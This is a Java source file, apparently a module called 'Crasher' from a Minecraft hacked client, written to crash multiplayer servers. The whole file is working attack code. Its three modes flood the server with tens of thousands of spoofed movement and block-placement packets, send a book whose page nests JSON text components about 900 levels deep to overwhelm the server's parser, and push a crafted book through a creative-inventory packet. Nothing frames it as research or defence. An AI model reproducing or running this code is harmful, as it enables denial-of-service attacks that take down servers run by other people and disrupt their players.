package lime.features.module.impl.exploit;

import lime.features.module.Category;
import lime.features.module.Module;
import lime.features.setting.impl.EnumValue;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class Crasher extends Module {
    public Crasher() {
        super("Crasher", Category.EXPLOIT);
    }

    private final EnumValue mode = new EnumValue("Mode", this, "Bungeecord Flood", "Bungeecord Flood", "Click Window", "Custom Payload");
    private Thread thread;

    @Override
    public void onEnable() {
        switch(mode.getSelected()) {
            case "Bungeecord Flood":
                thread = new Thread(() -> {
                    for (int i = 0; i < 10000; i++) {
                        mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer(true));
                        mc.getNetHandler().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new ItemStack(Items.bread)));
                        mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer(true));
                        mc.getNetHandler().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new ItemStack(Items.potato)));
                    }
                });
                break;
            case "Click Window":
                thread = new Thread(() -> {
                    NBTTagCompound nBTTagCompound = new NBTTagCompound();
                    NBTTagList nBTTagList = new NBTTagList();
                    String string = "";
                    string = String.valueOf(new StringBuilder().append(string).append("{"));
                    for (int n = 0; n < 900; ++n) {
                        string = String.valueOf(new StringBuilder().append(string).append("extra:[{"));
                    }
                    for (int n = 0; n < 900; ++n) {
                        string = String.valueOf(new StringBuilder().append(string).append("text:a}],"));
                    }
                    string = String.valueOf(new StringBuilder().append(string).append("text:a}"));
                    nBTTagList.appendTag(new NBTTagString(string));
                    nBTTagCompound.setString("author", "SnyCorleone");
                    nBTTagCompound.setString("title", "SMods 3.0");
                    nBTTagCompound.setByte("resolved", (byte)1);
                    nBTTagCompound.setTag("pages", nBTTagList);
                    ItemStack itemStack = new ItemStack(Items.writable_book);
                    itemStack.setTagCompound(nBTTagCompound);
                    mc.getNetHandler().sendPacketNoEvent(new C0EPacketClickWindow(0, 20, 100, 100, itemStack, (short) 100));
                });
                break;
            case "Custom Payload":
                thread = new Thread(() -> {
                    NBTTagCompound nBTTagCompound = new NBTTagCompound();
                    NBTTagList nBTTagList = new NBTTagList();
                    String string = "";
                    for (int i = 0; i < 900; ++i) {
                        string = String.valueOf(new StringBuilder().append(string).append("_"));
                    }
                    nBTTagList.appendTag(new NBTTagString(string));
                    nBTTagCompound.setString("author", "SnyCorleone");
                    nBTTagCompound.setString("title", "SMods 3.0");
                    nBTTagCompound.setByte("resolved", (byte)1);
                    nBTTagCompound.setTag("pages", nBTTagList);
                    ItemStack itemStack = new ItemStack(Items.writable_book);
                    itemStack.setTagCompound(nBTTagCompound);
                    mc.getNetHandler().sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, itemStack));
                });
                break;
        }
        thread.start();
    }

    @Override
    public void onDisable() {
        thread.stop();
    }
}
